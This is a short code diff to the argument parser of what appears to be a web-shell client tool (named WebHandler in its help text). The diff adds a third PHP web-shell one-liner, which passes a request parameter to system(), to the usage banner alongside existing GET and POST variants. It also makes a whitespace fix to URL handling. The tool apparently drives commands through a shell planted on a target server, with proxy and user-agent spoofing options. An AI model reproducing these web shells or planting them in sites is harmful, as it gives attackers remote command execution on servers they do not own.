@@ -30,7 +30,8 @@ class GetArgs(object):
 --   Which works for POST and GET requests:    --{end}
 
 {yellow}1-   <?php system($_GET['parameter']); ?>
-2-   <?php system($_POST['parameter']); ?>{end}
+2-   <?php system($_POST['parameter']); ?>
+3-   <?php system($_REQUEST['parameter']); ?>{end}
 
 run {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)
         exit(1)
@@ -56,7 +57,7 @@ Examples:
         optional.add_argument('-g', '--agent', dest='agent', help='user-agent (e.g. \'Mozilla/5.0\')', metavar='')
         optional.add_argument('-rg', '--random-agent', dest='random_agent', help='WebHandler will use some random user-agent', action='store_true')
         options = parser.parse_args()
-        url = options.url  if options.url.startswith('http') else "http://" + options.url
+        url = options.url if options.url.startswith('http') else "http://" + options.url
         method = options.method.lower() if options.method else None
         parameter = options.parameter
         proxy = options.proxy
